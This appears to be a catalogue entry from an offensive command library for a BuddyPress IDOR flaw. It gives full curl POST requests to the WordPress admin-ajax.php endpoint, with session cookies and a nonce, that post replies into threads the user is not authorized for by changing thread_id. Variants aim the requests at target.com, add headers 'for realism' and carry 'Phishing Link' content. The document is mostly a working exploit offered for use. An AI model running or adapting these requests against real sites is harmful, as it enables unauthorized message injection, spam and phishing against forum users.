---
id: cmd-001
data: >-
  curl -X POST http://127.0.0.1/wp-admin/admin-ajax.php -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101
  Firefox/64.0" -H "Accept: */*" -H "Referer:
  http://127.0.0.1/members/test2/messages/view/4/" -H "Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:
  XMLHttpRequest" -H "Cookie:
  wordpress_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7C64fbdf07238d2f448b8e53f6f1db7c64b014d7833386229505fefa70c9b2976e;
  wordpress_test_cookie=WP+Cookie+check;
  wordpress_logged_in_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7Ca309bfd19a1c2e4504e37959bd4ceac28944fce81857c2f7587022a4e6d2b7aa"
  -d
  "action=messages_send_reply&cookie=&_wpnonce=d037f67211&content=Test+Message&thread_id=1"
tags:
  - curl
  - ajax
  - injection
type: command
output: '{"success": true}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.360Z'
verified: false
validated: true
submitted: true
---
# buddypress-unauthorized-reply

## Command

```bash
curl -X POST http://127.0.0.1/wp-admin/admin-ajax.php -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" -H "Accept: */*" -H "Referer: http://127.0.0.1/members/test2/messages/view/4/" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: wordpress_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7C64fbdf07238d2f448b8e53f6f1db7c64b014d7833386229505fefa70c9b2976e; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7Ca309bfd19a1c2e4504e37959bd4ceac28944fce81857c2f7587022a4e6d2b7aa" -d "action=messages_send_reply&cookie=&_wpnonce=d037f67211&content=Test+Message&thread_id=1"
```

## Description

This curl command sends a crafted POST request to the BuddyPress AJAX endpoint to inject a reply into an unauthorized thread by manipulating the thread_id parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `http://127.0.0.1/wp-admin/admin-ajax.php` | Target AJAX endpoint URL | Yes |
| `-H "Cookie: ..."` | Authenticated session cookies | Yes |
| `-d "action=messages_send_reply"` | AJAX action for reply | Yes |
| `-d "_wpnonce=..."` | CSRF protection token | Yes |
| `-d "content=Test Message"` | Message body to inject | Yes |
| `-d "thread_id=1"` | Target thread ID (manipulate for IDOR) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/wp-admin/admin-ajax.php -H "Cookie: ..." -d "action=messages_send_reply&_wpnonce=...&content=Spam&thread_id=1"
```

### Advanced Usage

Add more headers for realism:

```bash
curl -X POST http://target.com/wp-admin/admin-ajax.php -H "X-Requested-With: XMLHttpRequest" -H "Referer: http://target.com/messages/view/1/" -H "Cookie: ..." -d "action=messages_send_reply&_wpnonce=...&content=Phishing Link&thread_id=5"
```

## Expected Output

JSON response like {"success": true, "data": "Message sent"}; indicates server accepted the injection without authorization check.

## Related

- [[procedures/Submit-Unauthorized-Reply]]
